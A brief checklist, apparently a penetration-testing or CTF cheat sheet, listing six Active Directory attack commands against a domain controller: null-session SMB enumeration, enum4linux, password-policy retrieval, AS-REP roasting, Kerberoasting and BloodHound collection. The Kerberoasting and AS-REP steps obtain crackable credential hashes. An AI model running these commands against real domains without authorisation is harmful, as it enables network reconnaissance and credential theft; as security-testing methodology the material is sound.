1. ALWAYS check for null sessions - `smbclient -N -L //DC`
2. ALWAYS run enum4linux - `enum4linux -a DC`
3. ALWAYS check password policy - `crackmapexec smb DC -u '' -p '' --pass-pol`
4. ALWAYS check for AS-REP roasting - `impacket-GetNPUsers domain.local/ -usersfile users.txt`
5. ALWAYS check for Kerberoasting - `impacket-GetUserSPNs domain.local/user:pass -request`
6. ALWAYS run BloodHound - `bloodhound-python -d domain -u user -p pass -ns DC -c all`